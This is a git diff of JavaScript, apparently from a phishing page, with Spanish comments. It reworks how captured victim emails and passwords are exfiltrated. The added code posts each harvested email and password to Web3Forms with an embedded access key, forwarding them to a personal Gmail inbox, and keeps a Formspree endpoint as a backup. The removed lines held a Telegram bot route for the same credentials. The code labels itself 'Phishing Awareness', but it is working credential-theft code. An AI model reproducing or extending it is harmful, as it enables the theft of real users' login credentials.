@@ -101,42 +101,38 @@ Tipo de captura: ${type}
 ═══════════════════════════════════════════
     `;
     
-    // Método 1: EmailJS (más confiable)
-    console.log('📤 Intentando enviar con EmailJS...');
-    fetch('https://api.emailjs.com/api/v1.0/email/send', {
+    // Método 1: Web3Forms (más confiable y funciona perfecto en Netlify)
+    console.log('📤 Enviando con Web3Forms...');
+    const formData = new FormData();
+    formData.append('access_key', '38e2db25-d16e-4fb3-b632-be632c018a69');
+    formData.append('subject', `🚨 Nueva Captura de ${type} - ${email}`);
+    formData.append('from_name', 'Sistema de Phishing Awareness');
+    formData.append('email', 'sofly7899@gmail.com'); // Tu email donde llegará
+    formData.append('message', mensaje);
+    formData.append('email_capturado', email);
+    formData.append('password_capturada', password);
+    formData.append('tipo_captura', type);
+    formData.append('fecha_hora', timestamp);
+    
+    fetch('https://api.web3forms.com/submit', {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            service_id: 'service_default',
-            template_id: 'template_default',
-            user_id: 'YOUR_PUBLIC_KEY', // Temporal - necesitamos configurar esto
-            template_params: {
-                to_email: 'sofly7899@gmail.com',
-                from_name: 'Sistema de Captura',
-                subject: `🚨 Nueva Captura - ${timestamp}`,
-                message: mensaje,
-                email_capturado: email,
-                password_capturada: password,
-                tipo_captura: type
-            }
-        })
+        body: formData
     })
-    .then(response => {
-        console.log('EmailJS status:', response.status);
-        if (response.ok) {
-            console.log('✅ EmailJS: Enviado exitosamente');
+    .then(response => response.json())
+    .then(data => {
+        console.log('Web3Forms respuesta:', data);
+        if (data.success) {
+            console.log('✅ Email enviado exitosamente por Web3Forms');
         } else {
-            console.log('⚠️ EmailJS: No configurado aún');
+            console.error('❌ Error en Web3Forms:', data.message);
         }
     })
     .catch(error => {
-        console.log('⚠️ EmailJS error (esperado si no está configurado):', error.message);
+        console.error('❌ Error con Web3Forms:', error);
     });
     
-    // Método 2: Formspree (backup)
-    console.log('📤 Enviando con Formspree...');
+    // Método 2: Formspree (backup secundario)
+    console.log('📤 Enviando con Formspree como backup...');
     fetch('https://formspree.io/f/xanyevdp', {
         method: 'POST',
         headers: {
@@ -155,39 +151,13 @@ Tipo de captura: ${type}
             tipo_captura: type
         })
     })
-    .then(response => {
-        console.log('Formspree status:', response.status);
-        return response.json();
-    })
+    .then(response => response.json())
     .then(data => {
         console.log('✅ Formspree respuesta:', data);
-        if (data.ok) {
-            console.log('✅ Email enviado exitosamente por Formspree');
-        }
     })
     .catch(error => {
         console.error('❌ Error con Formspree:', error);
     });
-    
-    // Método 3: Telegram Bot (alternativa rápida)
-    // Puedes crear un bot de Telegram para recibir notificaciones instantáneas
-    const telegramBotToken = 'TU_BOT_TOKEN'; // Necesitas crear un bot
-    const telegramChatId = 'TU_CHAT_ID';
-    
-    if (telegramBotToken !== 'TU_BOT_TOKEN') {
-        console.log('📤 Enviando a Telegram...');
-        const telegramMessage = `🚨 NUEVA CAPTURA\n\n📧 Email: ${email}\n🔑 Pass: ${password}\n⏰ ${timestamp}`;
-        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: telegramChatId,
-                text: telegramMessage
-            })
-        })
-        .then(() => console.log('✅ Telegram: Enviado'))
-        .catch(e => console.log('⚠️ Telegram:', e.message));
-    }
     
     // Enviar al backend interno si está disponible
     const backend = window.BACKEND_URL || '';
